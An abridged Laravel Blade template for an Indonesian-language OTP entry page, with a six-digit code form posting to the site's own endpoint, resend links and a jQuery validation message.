	...
	<body style="margin: 0px; background: #fb036b;">
	    ...
	    <form action="<?=url('/')?>/post-otp" method="post">
	        ...
	        <div class="wrapper"
	            ...
	            <div style="text-align: center; width: 100%; margin-bottom: 0.3em; color: white;">Masukan <b>Kode OTP</b>
	                kamu disini</div>
	            ...
	            <div class="container-mall" style="display: flex; justify-content: space-around;">
	                ...
	                <div class="footer-mall-menu"
	                    ...
	                    <div>
	                        <input type="text" name="kode_otp" id="nomor_hp" class="form-control"
	                            style="width: 100% !important; padding: .375rem; border: none; text-align: center;"
	                            placeholder="XXXXXX" maxlength=6 onkeypress='return isNumberKey(event)' required>
	                    </div>
	                </div>
	            </div>

	            <div style="display: flex; justify-content: center;">
	                <div style="text-align: center; width: 90%; margin-top: 0.3em; color: white;">Tidak Menemukan Kode OTP
	                    ? Silakan Tekan <b><a href="<?=url('/')?>/verifikasi-otp/{{ Request::segment(2) }}/kirim-ulang" class="text-white">Kirim Ulang</a></b> Kode OTP...</div>
	            </div>
	        </div>
	    ...
	    <div id="modal-lupa-otp" class="modal" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel"
	            ...
	            <div class="modal-content">
	                <div class="modal-body text-center font-weight-bold py-3">
	                    ...
	                    <div class="row mt-2 p-2">
	                        <a href="<?=url('/')?>/verifikasi-otp/{{ Request::segment(2) }}/kirim-ulang" class="col-sm-6 p-2 ">
	                            Kirim Ulang...
	                        </a>
	                        <button type="button" class="col-sm-6 btn waves-effect waves-light btn-outline-secondary"
	...
	<script>
	    ...
	    $("input[required], select[required]").attr("oninvalid",
	        "this.setCustomValidity('Harap Memasukkan Kode OTP')");
